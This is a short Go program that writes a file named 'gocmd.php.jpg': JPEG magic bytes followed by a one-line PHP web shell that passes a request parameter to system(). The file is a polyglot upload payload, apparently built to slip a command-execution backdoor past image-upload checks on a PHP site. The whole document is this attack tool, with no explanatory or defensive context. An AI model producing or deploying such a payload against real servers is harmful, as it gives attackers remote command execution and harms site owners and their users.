package main

import (
	"fmt"
	"os"
)

func main() {
	f, err := os.Create("gocmd.php.jpg")
	if err != nil {
		panic(err)
	}
	defer f.Close()

	// jpg - ff d8 ff db 00 00 00 00
	jpgMagicBytes := []byte{255, 216, 255, 219, 00, 00, 00, 00}
	bytesWritten, err := f.Write(jpgMagicBytes)
	if err != nil {
		panic(err)
	}
	fmt.Printf("wrote magic %d bytes\n", bytesWritten)

	stringBytesWritten, err := f.WriteString("<?php echo system($_REQUEST['cmd']); ?>\n")
	if err != nil {
		panic(err)
	}
	fmt.Printf("appended actual script content - %d bytes\n", stringBytesWritten)

	f.Sync()
}
